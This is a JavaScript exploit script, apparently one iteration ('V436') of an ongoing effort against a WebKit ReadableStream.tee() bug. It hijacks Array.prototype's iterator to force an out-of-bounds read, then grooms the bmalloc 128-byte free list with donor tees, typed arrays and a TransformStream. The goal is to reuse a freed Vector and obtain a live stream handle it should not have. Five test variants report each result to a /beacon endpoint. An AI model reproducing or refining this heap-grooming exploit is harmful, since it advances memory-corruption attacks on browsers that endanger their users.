/*
 * V436 -- Minimal tee OOB grooming
 *
 * V435 crashed because 50 donor tees invalidated HandleNodes.
 * Fix: ONE donor tee immediately before the OOB tee.
 *
 * The 128-byte Vector from the donor tee goes to bmalloc free list.
 * HandleSlot at offset 8 points to a HandleNode whose m_value is
 * alive (held by the returned ReadableStream wrappers).
 * Immediately reuse that block with a 1-element tee.
 * No GC, no intermediate allocations.
 *
 * Beacon prefix: V436-
 */
(function(){
"use strict";
var BQ = 0;
function B(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open("POST", "/beacon/V436-" + tag + "?q=" + (BQ++), false);
    x.setRequestHeader("Content-Type", "text/plain");
    x.send(typeof data === "object" ? JSON.stringify(data) : String(data || ""));
  } catch(e) {}
}

B("BOOT");

var origIter = Array.prototype[Symbol.iterator];

// 1-element tee: intercept SequenceConverter to yield only 1 item
function oobTee(rs) {
  var intercepted = false;
  Array.prototype[Symbol.iterator] = function() {
    var self = this;
    if (Array.isArray(self) && self.length === 2 && !intercepted) {
      // Check if this looks like the tee result (2 InternalReadableStream objects)
      if (typeof self[0] === "object" && self[0] !== null && !(self[0] instanceof ReadableStream)) {
        intercepted = true;
        var items = [self[0]]; // only first element
        var idx = 0;
        return {
          next: function() {
            if (idx < items.length) return {value: items[idx++], done: false};
            return {done: true};
          }
        };
      }
    }
    return origIter.call(self);
  };

  var result;
  try {
    result = rs.tee();
  } finally {
    Array.prototype[Symbol.iterator] = origIter;
  }
  return result;
}

// ================================================================
// Test A: Single donor -> immediate OOB
// ================================================================
function testA() {
  B("A-START");

  // Pre-create the OOB target stream BEFORE the donor
  var oobRS = new ReadableStream({
    start: function(c) { c.enqueue("oob-data"); c.close(); }
  });

  // Donor: normal 2-element tee. Creates 128-byte Vector with 2 HandleSlots.
  // Vector is freed on return, but HandleSlot values persist.
  var donorRS = new ReadableStream({
    start: function(c) { c.enqueue("donor"); c.close(); }
  });
  var donorBranches = donorRS.tee(); // keep alive!

  // IMMEDIATELY do OOB tee. New Vector should reuse donor's freed block.
  // Offset 8 = donor's HandleSlot[1] = points to alive InternalReadableStream
  try {
    var result = oobTee(oobRS);
    B("A-RESULT", {
      len: result.length,
      t0: result[0] ? result[0].constructor.name : "null",
      t1: result[1] ? result[1].constructor.name : "null"
    });

    if (result[1]) {
      try { B("A-LOCKED", result[1].locked); } catch(e) { B("A-LOCKED-ERR", e.message.slice(0,60)); }
      try {
        var r = result[1].getReader();
        B("A-READER-OK");
        r.read().then(function(res) {
          B("A-READ", {done: res.done, val: String(res.value).slice(0,40)});
          r.releaseLock();
        }).catch(function(e) { B("A-READ-ERR", e.message.slice(0,60)); });
      } catch(e) { B("A-READER-ERR", e.message.slice(0,60)); }
    }
  } catch(e) {
    B("A-CRASH", e.message.slice(0,80));
  }

  // Keep donor branches alive
  void donorBranches;
  B("A-DONE");
}

// ================================================================
// Test B: Multiple rapid attempts with different donor counts
// ================================================================
function testB() {
  B("B-START");
  var success = false;

  for (var attempt = 0; attempt < 5 && !success; attempt++) {
    // Pre-create OOB stream
    var oobRS = new ReadableStream({
      start: function(c) { c.enqueue("B-" + attempt); c.close(); }
    });

    // Create exactly (attempt+1) donor tees to push different blocks
    var donors = [];
    for (var d = 0; d < attempt + 1; d++) {
      var drs = new ReadableStream({
        start: function(c) { c.enqueue("d"); c.close(); }
      });
      donors.push(drs.tee());
    }

    try {
      var result = oobTee(oobRS);
      if (result && result[1]) {
        success = true;
        B("B-OK-" + attempt, {
          t1: result[1].constructor.name,
          donors: donors.length
        });
        try { B("B-LOCKED-" + attempt, result[1].locked); } catch(e) { B("B-LOCKED-ERR-" + attempt, e.message.slice(0,60)); }
        try {
          var r = result[1].getReader();
          B("B-READER-OK-" + attempt);
          r.read().then(function(res) {
            B("B-READ-" + attempt, {done: res.done, val: String(res.value).slice(0,40)});
          }).catch(function(e) { B("B-READ-ERR", e.message.slice(0,60)); });
        } catch(e) { B("B-READER-ERR-" + attempt, e.message.slice(0,60)); }
      } else {
        B("B-NULL-" + attempt);
      }
    } catch(e) {
      B("B-CRASH-" + attempt, e.message.slice(0,40));
    }

    void donors;
  }
  B("B-DONE");
}

// ================================================================
// Test C: Pre-warm bmalloc 128-byte class then single donor
// Idea: allocate and free 128-byte blocks to prime the free list,
// then donor tee puts its block on top, OOB reuses it.
// ================================================================
function testC() {
  B("C-START");

  // Pre-warm: create and free some 128-byte allocations
  // TypedArrays with specific sizes land in the same bmalloc class
  var warmers = [];
  for (var i = 0; i < 10; i++) {
    // Float64Array(16) = 128 bytes backing store
    warmers.push(new Float64Array(16));
  }
  // Release them
  warmers = null;

  // Pre-create OOB stream
  var oobRS = new ReadableStream({
    start: function(c) { c.enqueue("C-data"); c.close(); }
  });

  // Single donor tee
  var donorRS = new ReadableStream({
    start: function(c) { c.enqueue("C-donor"); c.close(); }
  });
  var donorBranches = donorRS.tee();

  // OOB tee
  try {
    var result = oobTee(oobRS);
    B("C-RESULT", {
      len: result.length,
      t0: result[0] ? result[0].constructor.name : "null",
      t1: result[1] ? result[1].constructor.name : "null"
    });

    if (result[1]) {
      try { B("C-LOCKED", result[1].locked); } catch(e) { B("C-LOCKED-ERR", e.message.slice(0,60)); }
      try {
        var r = result[1].getReader();
        B("C-READER-OK");
        r.read().then(function(res) {
          B("C-READ", {done: res.done, val: String(res.value).slice(0,40)});
        }).catch(function(e) { B("C-READ-ERR", e.message.slice(0,60)); });
      } catch(e) { B("C-READER-ERR", e.message.slice(0,60)); }
    }
  } catch(e) {
    B("C-CRASH", e.message.slice(0,80));
  }

  void donorBranches;
  B("C-DONE");
}

// ================================================================
// Test D: Check if result[1] is the SAME stream as donorBranches[1]
// If the OOB gives us the donor's internal stream, we have V433D
// (shared internal). Test by reading from both.
// ================================================================
function testD() {
  B("D-START");

  var oobRS = new ReadableStream({
    start: function(c) {
      c.enqueue("D-oob-1");
      c.enqueue("D-oob-2");
      c.close();
    }
  });

  var donorRS = new ReadableStream({
    start: function(c) {
      c.enqueue("D-donor-1");
      c.enqueue("D-donor-2");
      c.enqueue("D-donor-3");
      c.close();
    }
  });
  var donorBranches = donorRS.tee();

  try {
    var result = oobTee(oobRS);
    if (result && result[1]) {
      B("D-GOT-OOB");

      // Read from result[1] (the OOB stream)
      var oobReader;
      try {
        oobReader = result[1].getReader();
        B("D-OOB-READER-OK");
      } catch(e) {
        B("D-OOB-READER-ERR", e.message.slice(0,60));
      }

      // Check if donorBranches[1] is now locked
      // (would be locked if result[1] shares the same internal)
      try {
        B("D-DONOR1-LOCKED", donorBranches[1].locked);
      } catch(e) {
        B("D-DONOR1-LOCKED-ERR", e.message.slice(0,60));
      }

      // Try to read from donorBranches[1]
      try {
        var donorReader = donorBranches[1].getReader();
        B("D-DONOR1-READER-OK");
        donorReader.read().then(function(res) {
          B("D-DONOR1-READ", {done: res.done, val: String(res.value).slice(0,40)});
        }).catch(function(e) { B("D-DONOR1-READ-ERR", e.message.slice(0,60)); });
      } catch(e) {
        B("D-DONOR1-READER-ERR", e.message.slice(0,60));
      }

      // Read from OOB stream
      if (oobReader) {
        oobReader.read().then(function(res) {
          B("D-OOB-READ", {done: res.done, val: String(res.value).slice(0,40)});
        }).catch(function(e) { B("D-OOB-READ-ERR", e.message.slice(0,60)); });
      }
    } else {
      B("D-NO-OOB");
    }
  } catch(e) {
    B("D-CRASH", e.message.slice(0,80));
  }

  void donorBranches;
  B("D-DONE");
}

// ================================================================
// Test E: Alternative grooming -- use TransformStream constructor
// TransformStream also uses SequenceConverter with ASSERT(size==3)
// Its Vector is also 128 bytes. Different HandleSlot pattern.
// ================================================================
function testE() {
  B("E-START");

  // Create a TransformStream to put a 128-byte Vector block on free list
  try {
    var ts = new TransformStream();
    B("E-TS-OK");
  } catch(e) {
    B("E-TS-ERR", e.message.slice(0,60));
    return;
  }

  // Now do a single donor tee + OOB tee
  var oobRS = new ReadableStream({
    start: function(c) { c.enqueue("E-data"); c.close(); }
  });
  var donorRS = new ReadableStream({
    start: function(c) { c.enqueue("E-donor"); c.close(); }
  });
  var donorBranches = donorRS.tee();

  try {
    var result = oobTee(oobRS);
    B("E-RESULT", {
      len: result.length,
      t1: result[1] ? result[1].constructor.name : "null"
    });
    if (result[1]) {
      try { B("E-LOCKED", result[1].locked); } catch(e) { B("E-LOCKED-ERR", e.message.slice(0,60)); }
    }
  } catch(e) {
    B("E-CRASH", e.message.slice(0,80));
  }

  void donorBranches;
  void ts;
  B("E-DONE");
}

// Run sequentially
testA();
setTimeout(function() {
  testB();
  setTimeout(function() {
    testC();
    setTimeout(function() {
      testD();
      setTimeout(function() {
        testE();
        setTimeout(function() { B("ALL-DONE"); }, 2000);
      }, 2000);
    }, 2000);
  }, 2000);
}, 2000);

})();
